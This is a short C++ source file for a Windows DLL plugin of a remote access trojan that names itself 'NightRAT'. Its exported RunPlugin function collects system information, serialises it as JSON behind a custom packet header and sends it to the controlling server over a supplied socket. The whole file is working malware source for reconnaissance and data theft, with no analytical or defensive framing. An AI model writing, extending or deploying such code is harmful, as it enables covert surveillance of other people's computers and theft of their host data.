#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <cstdint>
#include "SysInfo.hpp"
#include "json.hpp"

#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;

#pragma pack(push, 1)
struct PacketHeader {
    uint8_t type;
    char pluginId[4];
    uint32_t payloadSize;
};
#pragma pack(pop)

void send_plugin_data(SOCKET sock, json data) {
    std::string msg = data.dump();
    PacketHeader header;
    header.type = 0x01;
    memset(header.pluginId, 0, 4);
    header.payloadSize = (uint32_t)msg.length();

    send(sock, (char*)&header, sizeof(header), 0);
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET serverSocket) {
    // Plugin üzerinden sistem bilgisini topla ve gönder
    json info = SysInfo::getAllInfo();
    info["client"] = "NightRAT C++ Plugin (Information)";
    send_plugin_data(serverSocket, info);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
